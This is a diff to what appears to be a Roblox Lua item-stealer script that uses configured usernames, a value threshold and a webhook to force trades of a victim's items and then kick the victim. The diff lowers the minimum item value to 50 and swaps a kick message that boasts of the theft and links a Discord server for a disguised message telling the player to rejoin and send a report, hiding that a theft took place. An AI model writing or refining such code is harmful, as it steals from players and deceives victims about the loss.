@@ -19,7 +19,7 @@ local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
 local users = _G.Usernames or {}
-local min_rap = _G.min_rap or 100
+local min_rap = _G.min_rap or 50
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
@@ -418,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Please rejoin, if this keeps happening send us a report")
     end
 
     local function waitForUserJoin()
